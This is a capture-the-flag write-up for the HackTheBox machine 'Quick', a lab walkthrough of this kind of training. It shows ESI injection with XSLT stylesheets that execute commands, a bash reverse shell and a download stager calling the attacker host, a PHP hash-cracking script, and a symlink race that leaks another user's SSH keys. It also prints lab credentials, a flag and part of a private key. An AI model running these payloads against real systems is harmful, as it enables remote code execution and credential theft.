---
layout: menu
title: "HTB Quick"
description: "10.10.10.186 | 40 pts"
header-img: "boxes/screenshots/62_quick/quick.png"
tags: [hackthebox, htb, boot2root, writeup, write-up, linux, quick, quick.htb, QUIC, QUIC protocol, HTTP3, Esigate, ESI injection, printer job, printer exploit, printer service, stored credentials]
---

# <span style="color:red">HTB Quick (10.10.10.186)</span>

---

## PART 1 : INITIAL ENUMERATION

### 1.1 nmap

```shell
$ nmap --min-rate 3000 -oN nmap-tcp.initial -p- -v 10.10.10.186

  PORT     STATE SERVICE
  22/tcp   open  ssh
  9001/tcp open  tor-orport

$ nmap -oN nmap-tcp -p 22,9001 -sC -sV -v 10.10.10.186

  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
  |   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
  |_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
  9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  | http-methods: 
  |_  Supported Methods: GET HEAD POST
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Quick | Broadband Services
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

$ sudo nmap -oN nmap-udp.initial -sU -v 10.10.10.186

  PORT    STATE         SERVICE
  443/udp open|filtered https
```

---

## PART 2 : PORT ENUMERATION

### 2.1 TCP PORT 9001 : HTTP

![Quick - index.php](./screenshots/61_quick/quick_index.png)

#### 2.1.1 Crawling `index.php` for "href" links:

```shell
$ curl http://10.10.10.186:9001 | grep -E '<a.*href=.*/a>' | sed -E 's/^.*<a.*href="(.*)">.*/\1/g'

  /login.php
  https://portal.quick.htb
  /clients.php
```

#### 2.1.2 Directory brute forcing using `gobuster`

```shell
$ gobuster dir -o 9001_gobuster.txt -u http://10.10.10.186:9001 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt

  /index.php            (Status: 200) [Size: 3353]
  /search.php           (Status: 200) [Size: 1]   
  /home.php             (Status: 200) [Size: 86]  
  /login.php            (Status: 200) [Size: 4345]
  /clients.php          (Status: 200) [Size: 2698]
  /db.php               (Status: 200) [Size: 0]   
  /ticket.php           (Status: 200) [Size: 86] 
```

#### 2.1.3 /login.php -- Login Page

![Quick - login.php](./screenshots/61_quick/quick_login.png)

#### 2.1.4 /clients.php -- Client List

\# | Client | Country
--- | --- | ---
1 | QConsulting Pvt Ltd | UK
2 | Darkwing Solutions | US
3 | Wink | UK
4 | LazyCoop Pvt Ltd | China
5 | ScoobyDoo | Italy
6 | PenguinCrop | France

#### 2.1.5 /index.php -- Potential Usernames

Name | Company | Possible Email
--- | --- | ---
Tim | Qconsulting Pvt Ltd | tim@qconsulting.co.uk
Roy | DarkWng Solutions | roy@darkwing.us; roy@darkwingsolutions.us 
Elisa | Wink Media | elisa@wink.co.uk; elisa@winkmedia.co.uk 
James | LazyCoop Pvt Ltd | james@lazycoop.com.cn

### 2.2 UDP PORT 443 : HTTPS

```shell
$ /opt/curl/src/curl --http3 https://portal.quick.htb
```

```html
<p> Welcome to Quick User Portal</p>
<ul>
  <li><a href="index.php">Home</a></li>
  <li><a href="index.php?view=contact">Contact</a></li>
  <li><a href="index.php?view=about">About</a></li>
  <li><a href="index.php?view=docs">References</a></li>
</ul>
```

```shell
$ /opt/curl/src/curl --http3 https://portal.quick.htb/index.php?view=docs
```

```html
<h1>Quick | References</h1>
<ul>
  <li><a href="docs/QuickStart.pdf">Quick-Start Guide</a></li>
  <li><a href="docs/Connectivity.pdf">Connectivity Guide</a></li>
</ul>
```

```shell
$ /opt/curl/src/curl --http3 --output Connectivity.pdf https://portal.quick.htb/docs/Connectivity.pdf
```

> How to Connect ?
> 1. Once router is up and running just navigate to http://172.15.0.4/quick_login.jsp
> 2. You can use your registered email address and Quick4cc3$$ as password.
> 3. Login and change your password for WiFi and ticketing system.
> 4. Don’t forget to ping us on chat whenever there is an issue.

---

## PART 3 : EXPLOITATION

### 3.1 http[://]quick.htb:9001/login.php

- __USERNAME__: elisa@wink.co.uk

- __PASSWORD__: Quick4cc3$$

  ```shell
  $ cookie='Cookie: PHPSESSID=4oqa66ge8q5dobkgich32rati2'
  ```

### 3.2 http[://]quick.htb:9001/home.php

![Quick - home.php](./screenshots/61_quick/quick_home.png)

```shell
$ curl -H $cookie -I http://quick.htb:9001/home.php

  HTTP/1.1 200 OK
  Server: Apache/2.4.29 (Ubuntu)
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Type: text/html; charset=UTF-8
  Via: 1.1 localhost (Apache-HttpClient/4.5.2 (cache))
  X-Powered-By: Esigate
  Content-Length: 2
```

### 3.3 http[://]quick.htb:9001/ticket.php

![Quick - ticket.php](./screenshots/61_quick/quick_ticket.png)

```shell
$ curl -H $cookie http://quick.htb:9001/ticket.php
```
```html
<form action="" method="POST">
	<center><br /><br />
    <table  border="0">
        <tr>
            <td align="center" >Title:</td>
            <td align="right" ><input type="text" name="title"/></td>
        </tr>
		<tr>
    		<td align="center">Message:</td><td align="right" ><textarea rows="7" cols="50" name="msg">Describe your query</textarea></td>
    	</tr>
		<tr>
    		<td align="center" colspan="3"><input type="submit"  value="Submit"/></td>
    	</tr>
	</table>
	<input type="hidden" name="id" value="TKT-3874"/>
</form>
```

### 3.4 ESI Injection Part 1 (RFI)

1. Create a file, __something.html__:
   ```console
   jebidiah was here
   ```
   
2. Start an HTTP Server using python:
   ```shell
   $ sudo python -m SimpleHTTPServer 80
   ```
   
3. Raise ticket with **ESI Server Include** payload that will request __something.html__:

   ```shell
   $ payload='<esi:include src="http://10.10.14.6/something.html" />'
   $ ticket='TKT-0007'
   $ curl -X POST -d "title=test&msg=$payload&id=$ticket" -H $cookie http://quick.htb:9001/ticket.php | tidy
   ```
   ```html
   <script>
   	alert("Ticket NO : \"TKT-0007\" raised. We will answer you as soon as possible");
       window.location.href="/home.php";
   </script>
   ```
   
4. Search the generated ticket:
   
   ```shell
   $ curl -G -d "search=$ticket" -H $cookie http://quick.htb:9001/search.php | tidy
   ```
   
   ```html
   <table border="2" width="100%">
   	<tr>
   		<td style="font-size:180%;">ID</td>
   		<td style="font-size:180%;">Title</td>
   		<td style="font-size:180%;">Description</td>
   		<td style="font-size:180%;">Status</td>
   	</tr>
   	<tr>
   		<td style="font-size:180%;">TKT-0007</td>
   		<td style="font-size:180%;">test</td>
   		<td style="font-size:180%;">jebidiah was here</td>
   		<td style="font-size:180%;">open</td>
   	</tr>
   </table>
   ```
   
5. Check the HTTP requests:

   ```console
   10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET /something.html HTTP/1.1" 200 -
   ```

### 3.5 ESI Injection Part 2 (RCE)

1. Create a file, __test.xsl__:

   ```xml
   <?xml version="1.0" ?>
   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:output method="xml" omit-xml-declaration="yes"/>
       <xsl:template match="/"
       xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
       xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
           <root>
               <xsl:variable name="cmd">
                   <![CDATA[curl http://10.10.14.6/something.html]]>
               </xsl:variable>
               <xsl:variable name="rtObj" select="rt:getRuntime()"/>
               <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
               Process: <xsl:value-of select="$process"/>
               Command: <xsl:value-of select="$cmd"/>
           </root>
       </xsl:template>
   </xsl:stylesheet>
   ```

2. Start an HTTP Server using python:

   ```shell
   $ sudo python -m SimpleHTTPServer 80
   ```

3. Raise ticket with **ESI Server Include** payload that will request __test.xsl__:

   ```shell
   $ payload='<esi:include src="http://localhost:9001" stylesheet="http://10.10.14.6/test3.xsl"></esi:include>'
   $ ticket='TKT-0008'
   $ curl -X POST -d "title=test&msg=$payload&id=$ticket" -H $cookie http://quick.htb:9001/ticket.php | tidy
   ```

   ```html
   <script>
   	alert("Ticket NO : \"TKT-0008\" raised. We will answer you as soon as possible");
       window.location.href="/home.php";
   </script>
   ```

4. Search the generated ticket:

   ```shell
   $ curl -G -d "search=$ticket" -H $cookie http://quick.htb:9001/search.php | tidy
   ```

   ```html
   <table border="2" width="100%">
   	<tr>
           <td style="font-size:180%;">ID</td>
           <td style="font-size:180%;">Title</td>
           <td style="font-size:180%;">Description</td>
           <td style="font-size:180%;">Status</td>
   	</tr>
       <tr>
           <td style="font-size:180%;">TKT-0014</td>
           <td style="font-size:180%;">test</td>
           <td style="font-size:180%;">
           	Process: Process[pid=2807, exitValue="not exited"] 
               Command: curl http://10.10.14.6/something.html
           </td>
           <td style="font-size:180%;">open</td>
       </tr>
   </table>
   ```

5. Check the HTTP requests:

   ```console
   10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET /test3.xsl HTTP/1.1" 200 -
   10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET /something.html HTTP/1.1" 200 -
   ```

---

## PART 4 : GENERATING A SHELL

### 4.1 Reverse Shell

1. Write a reverse shell on a file, __index.html__:
   ```sh
   bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
   ```

2. Create a stager file for the reverse shell -- __stager.xsl__: 
   ```xml
   <?xml version="1.0" ?>
   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:output method="xml" omit-xml-declaration="yes"/>
       <xsl:template match="/"
       xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
       xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
           <root>
               <xsl:variable name="cmd">
                   <![CDATA[curl --output /tmp/rev http://10.10.14.6]]>
               </xsl:variable>
               <xsl:variable name="rtObj" select="rt:getRuntime()"/>
               <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
               Process: <xsl:value-of select="$process"/>
               Command: <xsl:value-of select="$cmd"/>
           </root>
       </xsl:template>
   </xsl:stylesheet>
   ```

3. Raise a ticket that will request __stager.xsl__:
   ```shell
$ payload='<esi:include src="http://localhost:9001" stylesheet="http://10.10.14.6/stager.xsl"></esi:include>'
   $ ticket='TKT-0069'
   $ curl -X POST -d "title=test&msg=$payload&id=$ticket" -H $cookie http://quick.htb:9001/ticket.php
   ```

4. Search the generated ticket then view the HTTP requests on the `python` server:

   ```shell
   $ curl -G -d "search=$ticket" -H $cookie http://quick.htb:9001/search.php | tidy
   ```

   ```html
   <table border="2" width="100%">
       <tr>
           <td style="font-size:180%;">ID</td>
           <td style="font-size:180%;">Title</td>
           <td style="font-size:180%;">Description</td>
           <td style="font-size:180%;">Status</td>
       </tr>
       <tr>
           <td style="font-size:180%;">TKT-0069</td>
           <td style="font-size:180%;">test</td>
           <td style="font-size:180%;">
               Process: Process[pid=3448, exitValue="not exited"] 
               Command: curl --output /tmp/rev http://10.10.14.6
           </td>
           <td style="font-size:180%;">open</td>
       </tr>
   </table>
   ```

   ```console
   10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET /stager.xsl HTTP/1.1" 200 -
   10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET / HTTP/1.1" 200 -
   ```

5. Create another file that will call the reverse shell -- __shell.xsl__: 

   ```xml
   <?xml version="1.0" ?>
   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:output method="xml" omit-xml-declaration="yes"/>
       <xsl:template match="/"
       xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
       xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
           <root>
               <xsl:variable name="cmd">
                   <![CDATA[bash /tmp/rev]]>
               </xsl:variable>
               <xsl:variable name="rtObj" select="rt:getRuntime()"/>
               <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
               Process: <xsl:value-of select="$process"/>
               Command: <xsl:value-of select="$cmd"/>
           </root>
       </xsl:template>
   </xsl:stylesheet>
   ```

6. Start a __netcat__ listener:

   ```shell
   $ sudo nc -lvp 443
   ```

7. Raise a ticket that will request __shell.xsl__:

   ```shell
   $ payload='<esi:include src="http://localhost:9001" stylesheet="http://10.10.14.6/shell.xsl"></esi:include>'
   $ ticket='TKT-0420'
   $ curl -X POST -d "title=test&msg=$payload&id=$ticket" -H $cookie http://quick.htb:9001/ticket.php
   ```

8. Search the generated ticket then view the HTTP requests on the `python` server:

   ```shell
   $ curl -G -d "search=$ticket" -H $cookie http://quick.htb:9001/search.php | tidy
   ```

   ```html
   <table border="2" width="100%">
       <tr>
           <td style="font-size:180%;">ID</td>
           <td style="font-size:180%;">Title</td>
           <td style="font-size:180%;">Description</td>
           <td style="font-size:180%;">Status</td>
       </tr>
       <tr>
           <td style="font-size:180%;">TKT-0069</td>
           <td style="font-size:180%;">test</td>
           <td style="font-size:180%;">
               Process: Process[pid=3480, exitValue="not exited"] 
               Command: bash /tmp/rev
           </td>
           <td style="font-size:180%;">open</td>
       </tr>
   </table>
   ```

   ```console
   10.10.10.186 - - [xx/xxx/xxxx xx:xx:xx] "GET /shell.xsl HTTP/1.1" 200 -
   ```
   
9. Look back to the __netcat__ listener:

   ```shell
   sam@quick:~$ id
   
     uid=1000(sam) gid=1000(sam) groups=1000(sam)
     
   sam@quick:~$ cat /etc/passwd | grep -E 'sh$'
   
     root:x:0:0:root:/root:/bin/bash
     sam:x:1000:1000:sam:/home/sam:/bin/bash
     srvadm:x:1001:1001:,,,:/home/srvadm:/bin/bash
     
   sam@quick:~$ cat user.txt
   
     339096973b4f74d1d914f923620dd10f
   ```

### 4.2 Connection via SSH

1. Generating an RSA key pair:

   ```shell
   $ ssh-keygen
   
     Generating public/private rsa key pair.
     Enter file in which to save the key (/home/kali/.ssh/id_rsa): ./id_rsa
     Enter passphrase (empty for no passphrase): 
     Enter same passphrase again:
     
   $ chmod 400 id_rsa
   ```

2. Add the public key to `/home/sam/.ssh/authorized_keys` using the reverse shell:

   ```shell
   sam@quick:~$ mkdir .ssh
   
   sam@quick:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDM08yfr4LnEIwMdMN1RyMvEqfMXL+1OzvjbnZJ6Wp3pmG3lwBot9NKVFtSRPmb+U0c1b/4gmcWmxy+S+KEW8FIg7FRvHejBWFnFnRTnI1AKjab9ia+Na6ujT4e0OkE8+/wgJiUzKiDOdSD8uphSwwDdvwM+NnjY1gL0DTOZc6OsDmHwrNM6DQV+RQaqMfpsIPGhYHFJ39eU6jYhASicViF/PbdOhBS/ibsstCL0W15DBW68ugjOXZsoeNVIsoubzAhU82OzyeMENB2WEjUr8vkW6WnGqhpaETJJs7lnJclGxqCQOz78gIaBADQ9D9lmtI6wrSk5+WZH9nFhgBQsvRv1rEMTGJWwqNx4O9klp02GEauKzoknE1EWiQNMfIWQWImILCRmZtI4KgVl44OC1dH1znCdcf5vHK0lYvYUQpaXUEQxaGRC7uAqX+mcOOReaNaMXHLZmd3LBJXmYSTQkiAT/UaOi5nSuhbylT6DwlkrxlMookXUA8YCe5pC59SUlU=" >> .ssh/authorized_keys
   ```

3. Connect to the machine via SSH:

   ```shell
   $ chmod 400 id_rsa
   
   $ ssh -i id_rsa -l sam 10.10.10.186
   ```

---

## PART 5 : CHANGING USER (sam -> srvadm)

### 5.1 Web Service Enumeration

```shell
sam@quick:~$ ls -l /var/www/

  drwxr-xr-x  2 root root 4096 Mar 20  2020 html
  drwxrwxrwx  2 root root 4096 Mar 21  2020 jobs
  drwxr-xr-x  6 root root 4096 Mar 21  2020 printer
```

#### 5.1.1 /var/www/html

Checking `/var/www/html/db.php` for database credentials:

```shell
sam@quick:~$ cat /var/www/html/db.php
```
```php
<?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?>
```

Then using it to check for other user credentials stored in the database:
```shell
sam@quick:~$ mysql -udb_adm -pdb_p4ss -e "SHOW DATABASES;"

  +--------------------+
  | Database           |
  +--------------------+
  | information_schema |
  | mysql              |
  | performance_schema |
  | quick              |
  | sys                |
  +--------------------+

sam@quick:~$ mysql -udb_adm -pdb_p4ss -e "USE quick; SHOW TABLES;"

  +-----------------+
  | Tables_in_quick |
  +-----------------+
  | jobs            |
  | tickets         |
  | users           |
  +-----------------+

sam@quick:~$ mysql -udb_adm -pdb_p4ss -e "SELECT * FROM quick.users;"

  +--------------+------------------+----------------------------------+
  | name         | email            | password                         |
  +--------------+------------------+----------------------------------+
  | Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
  | Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
  +--------------+------------------+----------------------------------+

sam@quick:~$ echo -n 'Quick4cc3$$' | md5sum

  8c6f51e1061b8a1feceb569da5a94691  -
```
The password for `elisa@wink.co.uk`, although to be known as `Quick4cc3$$`, don't seem to match the hash stored in the database.

Seeing how the password hashes are generated:
```shell
sam@quick:~$ cat /var/www/html/login.php
```
```php
<?php 
include("db.php");
if(isset($_POST["email"]) && isset($_POST["password"]))
{
	$email=$_POST["email"];
	$password = $_POST["password"];
	$password = md5(crypt($password,'fa'));
    $stmt=$conn->prepare("select email,password from users where email=? and password=?");
    $stmt->bind_param("ss",$email,$password);
    $stmt->execute();
    $result = $stmt->get_result();
    $num_rows = $result->num_rows;
    if($num_rows > 0)
   	{
		session_start();
	   	$_SESSION["loggedin"]=$email;
	   	header("location: home.php");
   	}
   	else
   	{
	   	echo '<script>alert("Invalid Credentials");window.location.href="/login.php";</script>';
   	}
}
else
{?>
[...html...]
<?php } ?>
```

The plaintext password is passed through a `crypt()` function before hashing using `md5()`.

#### 5.1.2 /var/www/printer

Checking the running processes on the machine:

```shell
sam@quick:~$ ps -auwwx --forest | grep -B2 -E "^sam"

  root [...omitted...] /usr/sbin/cron -f
  root [...omitted...]  \_ /usr/sbin/CRON -f
  sam  [...omitted...]      \_ /bin/sh -c /usr/bin/java -Desigate.config=/home/sam/esigate-distribution-5.2/apps/esigate.properties -Dserver.port=9001 -jar /home/sam/esigate-distribution-5.2/apps/esigate-server.jar start
```

Checking the contents of `/home/sam/esigate-distribution-5.2/apps/esigate.properties`:

```shell
sam@quick:~$ cat /home/sam/esigate-distribution-5.2/apps/esigate.properties

  esigate.remoteUrlBase=http://localhost:80/
  esigate.mappings=/*
```

All services running via HTTP using localhost should be accessible via port 9001 based on the running process for __*Esigate*__. And as previously inaccessible, there seems to be another deployed service in the machine:

```shell
sam@quick:~$ cat /etc/apache2/sites-enabled/000-default.conf | grep -v -E "#|^\s*$"
```

```xml
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
	AssignUserId srvadm srvadm
	ServerName printerv2.quick.htb
	DocumentRoot /var/www/printer
</VirtualHost>
```

There is a *printer* service running as __`printerv2.quick.htb`__ but it is not accessible via port 9001. Looking at the open ports, there is indeed a service running on port 80:

```shell
sam@quick:~$ netstat -plnt

  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
  tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
  tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -                   
  tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
  tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
  tcp        0      0 127.0.0.1:43735         0.0.0.0:*               LISTEN      -                   
  tcp6       0      0 :::9001                 :::*                    LISTEN      897/java            
  tcp6       0      0 127.0.0.1:8081          :::*                    LISTEN      897/java            
  tcp6       0      0 :::22                   :::*                    LISTEN      -               
```

Since there is a service running on port 80, `printerv2.quick.htb` should be accessible locally but the virtual host name is not listed in the `/etc/hosts` file.

### 5.2 Password Cracking (srvadm@quick.htb)

Validating the way the password hashes are generated

```shell
$ php -a

php > echo md5(crypt('Quick4cc3$$', 'fa'));

  c6c35ae1f3cb19438e0199cfa72a9d9d
```

The password of __`elisa@wink.co.uk`__ is indeed hashed as `c6c35ae1f3cb19438e0199cfa72a9d9d` in the database. And using the same functions to crack the password of __`srvadm@quick.htb`__:

```php
<?php
	$wordlist = "/usr/share/wordlists/rockyou.txt";
	$wordlist_file = fopen($wordlist, "r");

	while(! feof($wordlist_file)) {
		$password = substr(fgets($wordlist_file), 0, -1);
		$hash = md5(crypt($password, 'fa'));

		if ($hash == "e626d51f8fbfd1124fdea88396c35d05") {
			echo $password;
			break;
		}
	}
	
	fclose($wordlist_file);
?>
```

```shell
$ php cracker.php

  yl51pbx
  
$ php -a

php > echo md5(crypt('yl51pbx', 'fa'));
  
  e626d51f8fbfd1124fdea88396c35d05
```

The password has been successfully cracked -- `yl51pbx`. Using this password to switch users using `su` does not work so access to __printerv2.quick.htb__ might be necessary for privilege escalation.

### 5.3 Forwarding `printerv2.quick.htb`

Getting the service to run locally using port forwarding:

```shell
$ ssh -i id_rsa -l sam -L 9001:127.0.0.1:80 -f -N 10.10.10.186
```

Afterwards, point `printerv2.quick.htb` to `127.0.0.1` in `/etc/hosts`:

```console
127.0.0.1	localhost printerv2.quick.htb
```

The service should now be accessible:

![printerv2 - login.php](./screenshots/61_quick/printerv2_login.png)

```shell
$ curl -I http://printerv2.quick.htb:9001                                  

  HTTP/1.1 200 OK
  Date: Fri, 02 Apr 2021 17:02:58 GMT
  Server: Apache/2.4.29 (Ubuntu)
  Content-Type: text/html; charset=UTF-8
```

### 5.4 The Printer Service

#### 5.4.1 Figuring out the login credentials

Based on `/var/www/printer/db.php`, it's' using the same database as the ticketing service.

```shell
sam@quick:~$ cat /var/www/printer/db.php
```
```php
<?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?>
```

However, based on `/var/www/printer/index.php`, the credentials used should be the account of `srvadm@quick.htb`:

```php
<?php
include("db.php");
if(isset($_POST["email"]) && isset($_POST["password"]))
{
        $email=$_POST["email"];
        $password = $_POST["password"];
        $password = md5(crypt($password,'fa'));
        $stmt=$conn->prepare("select email,password from users where email=? and password=?");
        $stmt->bind_param("ss",$email,$password);
        $stmt->execute();
        $result = $stmt->get_result();
        $num_rows = $result->num_rows;
        if($num_rows > 0 && $email === "srvadm@quick.htb")
        {
                session_start();
                $_SESSION["loggedin"]=$email;
                header("location: home.php");
        }
        else
        {
                echo '<script>alert("Invalid Credentials");window.location.href="/index.php";</script>';
        }
}
else
{?>
[...html...]
<?php } ?>
```

The cracked password from earlier should work for the login page and it should bring you to:

![printerv2 - home.php](./screenshots/61_quick/printerv2_home.png)

#### 5.4.2 Creating print jobs

First a printer needs to be added to the service. This could be connected to your local machine:

![Quick - add_printer.php](./screenshots/61_quick/printerv2_add_printer.png)

Then to test if the service could connect to "your printer":

```shell
$ curl -d 'job=print&title=jebidiah' -G -H 'Cookie: PHPSESSID=p0qavq2tftut9ia1vcf6haffqo' http://printerv2.quick.htb:9001/printers.php
```

With that setup, you can now create print jobs using the following command:

![printerv2_job](./screenshots/61_quick/printerv2_job.png)

```shell
$ printed_text='Something that will be sent to the printer'
$ curl -X POST -d "title=jebidiah&desc=$printed_text&submit=" -H 'Cookie: PHPSESSID=p0qavq2tftut9ia1vcf6haffqo' http://printerv2.quick.htb:9001/job.php
```

#### 5.4.3 Exploiting the Printer Jobs

```shell
<?php
require __DIR__ . '/escpos-php/vendor/autoload.php';
use Mike42\Escpos\PrintConnectors\NetworkPrintConnector;
use Mike42\Escpos\Printer;
include("db.php");
session_start();

if($_SESSION["loggedin"])
{
	if(isset($_POST["submit"]))
	{
		$title=$_POST["title"];
		$file = date("Y-m-d_H:i:s");
		file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
		chmod("/var/www/printer/jobs/".$file,"0777");
		$stmt=$conn->prepare("select ip,port from jobs");
		$stmt->execute();
		$result=$stmt->get_result();
		if($result->num_rows > 0)
		{
			$row=$result->fetch_assoc();
			$ip=$row["ip"];
			$port=$row["port"];
			try
			{
				$connector = new NetworkPrintConnector($ip,$port);
				sleep(0.5); //Buffer for socket check
				$printer = new Printer($connector);
				$printer -> text(file_get_contents("/var/www/jobs/".$file));
				$printer -> cut();
				$printer -> close();
				$message="Job assigned";
				unlink("/var/www/jobs/".$file);
			}
			catch(Exception $error) 
			{
				$error="Can't connect to printer.";
				unlink("/var/www/jobs/".$file);
			}
		}
		else
		{
			$error="Couldn't find printer.";
		}
	}
?>
[...html...]
<?php } 
else
{
	echo '<script>alert("Invalid Username/Password");window.location.href="index.php";</script>';
}?>
```

```shell
sam@quick:~$ while [ -z $(ls -tr /var/www/jobs) ]; do : ; done; job=$(ls -tr /var/www/jobs | head -n1); rm -f "/var/www/jobs/${job}"; ln -s /home/srvadm/.ssh/authorized_keys /var/www/jobs/${job}
```

The bash script executed above will wait for a new print job to be created and then leveraging the 0.5 seconds sleep time of the job execution by deleting and replacing the file with a similar filename but symbolically linked to a file of your choice; in this case -- `/home/srvadm/.ssh/authorized_keys`

```shell
$ curl -X POST -d "title=jebidiah&desc=$printed_text&submit=" -H 'Cookie: PHPSESSID=p0qavq2tftut9ia1vcf6haffqo' --silent http://printerv2.quick.htb:9001/job.php >/dev/null
```

After starting a listener on port 9100 using netcat, the job will be triggered by the command above.

```shell
$ nc -k -nlvp 9100

  connect to [10.10.14.6] from (UNKNOWN) [10.10.10.186] 55768
  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC61KWlksWhB9tpFPs7ys/wuyMTzhAk95ZAmOLowXRL9EYJ3g8A/VRYPboIBoPLgnsHZ/kz+jlcRghl5H4opKH6YP/8U7L47eyohfftqcWqq+ElDoPUvZY6yRajJnMapvyv3iA31NdbxNGXPuEyqraN9YGAabdhXMwphJixaLp1VhOVUZgMs1v/zxqBRAZHxwA1GKz/ZyRYr4aLJOjmmBlpydI3/rWnUK2/QgL/MI4jmn0Iqd3CE69uaPM2+H9vR5dthD9GnmvIu5IktnVo+u0r4sKeqMorSHAfyAqR1mT93c5+riKFGJCVqTA+WwfLZqbU76yaDTbXgczJBB2fuUT1 srvadm@quick
  VA
```

Looking back to the listener, the contents of the `authorized_keys` file has now been sent to the "printer" meaning the __arbitrary file read__ of files owned or readable by __`sysadm`__ succeeded.

#### 5.4.4 Reading files with `sysadm`

Now to see if there is also a private key stored in the same directory using the same process above:

```shell
sam@quick:~$ while [ -z $(ls -tr /var/www/jobs) ]; do : ; done; job=$(ls -tr /var/www/jobs | head -n1); rm -f "/var/www/jobs/${job}"; ln -s /home/srvadm/.ssh/id_rsa /var/www/jobs/${job}
```

```shell
$ curl -X POST -d "title=jebidiah&desc=$printed_text&submit=" -H 'Cookie: PHPSESSID=p0qavq2tftut9ia1vcf6haffqo' --silent http://printerv2.quick.htb:9001/job.php >/dev/null
```

```shell
$ nc -lvp 9100

  connect to [10.10.14.6] from (UNKNOWN) [10.10.10.186] 55756
  -----BEGIN RSA PRIVATE KEY-----
  MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
  AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
  1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
  DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
  whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
  hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
  ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
  Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
  DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
  j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
  H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
  9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
  bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
  F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
  T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
  8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
  b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
  pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
  GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
  Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
